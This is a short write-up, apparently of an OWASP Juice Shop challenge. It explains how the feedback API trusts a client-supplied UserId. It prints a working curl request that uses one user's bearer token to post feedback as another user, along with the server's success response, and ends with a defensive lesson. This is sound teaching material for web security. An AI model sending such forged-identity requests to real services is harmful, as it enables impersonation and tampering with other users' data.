The most difficult part of this challenge was determining what they mean by
"feedback." Is is feedback on a particular shop item, feedback via a complaint,
or feedback via a "Contact Us" submission?

After trying all 3, turns out it was via a "Contact Us" submission. The API
endpoint for submitting the "Contact Us" form allows the client to specify the
User ID of the submitter.

If we pull the submission post from the Chrome inspector via the "Copy as
cURL" feature we can easily grab a `curl` command for submitting the form. E.g.

```
$ curl 'http://localhost:3000/api/Feedbacks/' -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MiwiZW1haWwiOiJqaW1AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6ImU1NDFjYTdlY2Y3MmI4ZDEyODY0NzRmYzYxM2U1ZTQ1IiwiY3JlYXRlZEF0IjoiMjAxOC0wMi0wNSAxMToxNjoxMy4zODggKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAxOC0wMi0wNSAxMToxNjoxMy4zODggKzAwOjAwIn0sImlhdCI6MTUxNzgzNTQwNywiZXhwIjoxNTE3ODUzNDA3fQ.S2hqT5yEvtJKgohm4FrExMGRIIx3-H85wHK383n_dPNdQcHhjivwRsC8B44eJmmfyg0AWz87AihQ9YV4t6xJXHblGr05P4Rb0vFYaHZTxAqkFglUehrqONId_lTDOx_Z4DGvrjSWJkxE0wutGjICrNIPwteHkr4G79iwOOh7Xdk' --data-binary '{"UserId":3,"comment":"WAT","rating":1}'
{"status":"success","data":{"id":12,"updatedAt":"2018-02-05T15:14:33.591Z","createdAt":"2018-02-05T15:14:33.591Z","comment":null,"rating":null,"UserId":null}}
```

So, despite using the authorization token for `jim` (User ID `2`), we can
submit customer feedback for `bender` (User ID `3`).

And the lesson for the day is... Don't let the client determine which user it's
submitting data for.
